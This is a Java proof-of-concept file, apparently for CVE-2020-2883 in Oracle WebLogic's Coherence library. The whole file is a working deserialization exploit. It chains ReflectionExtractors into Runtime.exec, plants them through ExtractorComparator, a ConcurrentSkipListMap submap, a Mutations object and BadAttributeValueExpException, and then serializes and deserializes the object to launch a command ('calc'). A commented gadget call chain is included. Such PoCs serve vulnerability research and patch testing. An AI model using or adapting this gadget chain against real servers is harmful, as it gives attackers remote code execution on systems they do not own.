package com.r17a.weblogic.cve;

import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.internal.sleepycat.persist.evolve.Mutations;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.concurrent.ConcurrentNavigableMap;
import java.util.concurrent.ConcurrentSkipListMap;

/**
 * javax.management.BadAttributeValueExpException.readObject()
 * com.tangosol.internal.sleepycat.persist.evolve.Mutations.toString()
 * java.util.concurrent.ConcurrentSkipListMap$SubMap.size()
 * java.util.concurrent.ConcurrentSkipListMap$SubMap.isBeforeEnd()
 * java.util.concurrent.ConcurrentSkipListMap.cpr()
 * com.tangosol.util.comparator.ExtractorComparator.compare()
 * com.tangosol.util.extractor.ChainedExtractor.extract()
 * com.tangosol.util.extractor.ReflectionExtractor().extract()
 * Method.invoke()
 * //...
 * com.tangosol.util.extractor.ReflectionExtractor().extract()
 * Method.invoke()
 * Runtime.exec()
 */

public class CVE_2020_2883_POC2 {

    public static void main(String[] args) throws Exception {
        String command = "calc";
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(Runtime.class),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{command})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        ConcurrentSkipListMap concurrentSkipListMap = new ConcurrentSkipListMap<String, String>();
        Field comparator = concurrentSkipListMap.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(concurrentSkipListMap, extractorComparator);

        ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap("foo", false, "bar", false);

        // crafted Mutations Object
        Mutations mutations = new Mutations();
        Field renamers = mutations.getClass().getDeclaredField("renamers");
        renamers.setAccessible(true);
        renamers.set(mutations, subMap);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, mutations);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(val);
        oos.flush();
        oos.close();
        // 反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = (Object) ois.readObject();
    }
}

